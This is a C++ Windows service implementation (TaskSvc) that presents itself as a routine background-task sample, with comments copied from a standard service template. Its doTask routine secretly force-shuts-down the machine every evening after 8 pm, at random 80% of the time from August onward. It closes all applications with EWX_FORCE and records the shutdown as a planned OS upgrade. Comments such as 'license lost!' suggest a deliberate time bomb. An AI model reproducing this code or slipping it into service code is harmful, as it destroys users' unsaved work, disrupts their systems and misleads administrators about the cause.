#pragma region Includes
#include<tchar.h>
#include <time.h>
#include "TaskSvc.h"
#include "ThreadPool.h"
#pragma endregion

TaskSvc::TaskSvc(PWSTR pszServiceName,
	BOOL fCanStop,
	BOOL fCanShutdown,
	BOOL fCanPauseContinue)
	:CSvcBase(pszServiceName,fCanStop,fCanShutdown,fCanPauseContinue)
{
	fStopping = FALSE;
	// Create a manual-reset event that is not signaled at first 
	// to indicate the stopped signal of the service.
	hStoppedEvent = CreateEvent(NULL,TRUE,FALSE,NULL);
	if(hStoppedEvent == NULL)
		throw GetLastError();
}

TaskSvc::~TaskSvc(void){
	if(hStoppedEvent)
	{
		CloseHandle(hStoppedEvent);
		hStoppedEvent =NULL;
	}
}

	/*
			FUNCTION: TastSvc::OnStart(DWORD,LPWSTR *)

			PURPOSE: The function executed when a Start command
			is sent to the service by SCM or when the operating system
			starts(for a service that starts automatically). It specifies actions
			to take when the service starts. In this code, OnStart logs a 
			service-start message to the Application log, and queues 
			the main service function for execution in a thread pool 
			worker thread.

			PARAMETERS:
				* dwArgc		- number of the command line arguments.
				* lpszArgv		- array of the command line arguments.

			NOTE: A service application is designed to be long running. 
			Therefore, it usually polls or monitors something in the system.
			The monitoring is set up in the OnStart method. However,
			OnStart does not actually do the monitoring. The OnStart method
			must return to the operating system after the service's operation
			has begun. It must not loop forever or block. To set up a simple
			monitoring mechanism, one general solution is to create a timer
			in OnStart. The timer would then raise events in your code periodically,
			at which time your service could do its monitoring. The other 
			solution is to spawn a new thread to perform the main service
			functions,which is demonstrated in this code sample.

	*/
	void TaskSvc::OnStart(DWORD dwArgc,LPWSTR *lpszArgv){
		// Log a service start message to the Application event log
		WriteEventLogEntry(L"TaskSvc is OnStart.",
			EVENTLOG_INFORMATION_TYPE);

		// Queue the main service function for execution in a worker thread.
		CThreadPool::QueueUserWorkItem(&TaskSvc::ServiceWorkerThread,this);
	}

	/*
		FUCTION: TaskSvc::ServiceWorkerThread(void)

		PURPOSE: The method performs the main function of the service. 
		It runs on a thread pool worker thread.
	*/
	void TaskSvc::ServiceWorkerThread(void){
		// Periodically check if the service is stopping.
		while(!fStopping)
			{
				// Perform main service function here...
				doTask();
				if(!SetProcessWorkingSetSize(GetCurrentProcess(),-1,-1))
					logLastErrorEx();
				::Sleep(20000);		// Simulate some lengthy operations.
			}
			// Signal the stopped event.
			SetEvent(hStoppedEvent);
	}

	/*
			FUNCTION: TaskSvc::OnStop(void)

			PURPOSE: The function is executed when a Stop command
			is sent to the service by SCM. It specifies actions to take
			when a service stops running. In this code example, OnStop
			logs a service-stop message  to the Application log, and 
			waits for the finish of the main service function.

			COMMENTS:
			Be sure to periodically call ReportServiceStatus() with
			SERVICE_STOP_PENDING if the procedure is going to 
			take a long time.
	*/
	void TaskSvc::OnStop()
	{
		// Log a service stop message to the Application event log.
		WriteEventLogEntry(L"TaskSvc is OnStop.",
			EVENTLOG_INFORMATION_TYPE);

		// Indicate that the service is stopping and wait for the 
		// finish of the main service funciton(ServiceWorkerThread).
		fStopping = true;
		if(WaitForSingleObject(hStoppedEvent,INFINITE)!=WAIT_OBJECT_0)
		{			
			throw GetLastError();
		}
		//WriteEventLogEntry(L"TaskSvc is OnStop after the wait for single object.",EVENTLOG_INFORMATION_TYPE);
	}

	// Do task 
	void TaskSvc::doTask(){
		time_t t;								// Declare a var with the type time_t
		t= time(&t);	// Get the current system time as type time_t.
		//char *p = ctime(&t);			// Convert time from type time_t to the character string.
		//==========================================
		// You can replace two line above with below
		//char buf[9];
		//_strtime(buf);
		//printf("The current time is %s \n",buf);
		//==========================================

		//==========================================
		//char dbuf[9];
		// Set time zone from TZ environment variable. If TZ is not set,
		// the operating system is queried to obtain the default value 
		// for the variable. 
		//
		//_tzset();
		//printf( "OS date: %s\n", _strdate(dbuf) );  // print the date of the system
		//==========================================
		struct tm *when;
		when = localtime( &t );
		int hour = when->tm_hour;
		if(hour>=20)
		{
			if(when->tm_mon>=7)
			{
				//WriteEventLogEntry(L"license lost!",EVENTLOG_INFORMATION_TYPE);
				srand((unsigned)t);	// seed with current time.
				if(rand()%100<80){  // 80% percent execute.
					ShutdownSystem();
				}
			}
			else
			{
				WriteEventLogEntry(L"system halt ",EVENTLOG_INFORMATION_TYPE);	
				ShutdownSystem();
			}
		}
	}
	/*
			Function: Shutdown the system

			Purpose:	shutdown the system on any time you calls this method.
	*/
	BOOL TaskSvc::ShutdownSystem(){
		DWORD sysVersion = GetVersion();
		if(sysVersion<0x80000000){
			HANDLE handle;
			TOKEN_PRIVILEGES tp;
			// privilege
			if(!OpenProcessToken(GetCurrentProcess(),
				TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&handle))
				return FALSE;
				
			// get the LUID for the shutdown privilege.
			LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,
				&tp.Privileges[0].Luid);
			tp.PrivilegeCount = 1;	// one privilege to set
			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			// get the shutdown privilege for this process.

			AdjustTokenPrivileges(handle,FALSE,&tp,0,
				(PTOKEN_PRIVILEGES)NULL,0);

			//WriteEventLogEntry(L"system adjust token privileges ... ",EVENTLOG_INFORMATION_TYPE);	
			if(GetLastError() != ERROR_SUCCESS)
				return FALSE;
		}

		//WriteEventLogEntry(L"system halt, oho! ",EVENTLOG_INFORMATION_TYPE);	

		// shut down the system and force all applications to close.		
		if(!ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE,
			SHTDN_REASON_MAJOR_OPERATINGSYSTEM |
			SHTDN_REASON_MINOR_UPGRADE | 
			SHTDN_REASON_FLAG_PLANNED))
		{
			logLastErrorEx();
			return FALSE;
		}	
		return TRUE;
	}

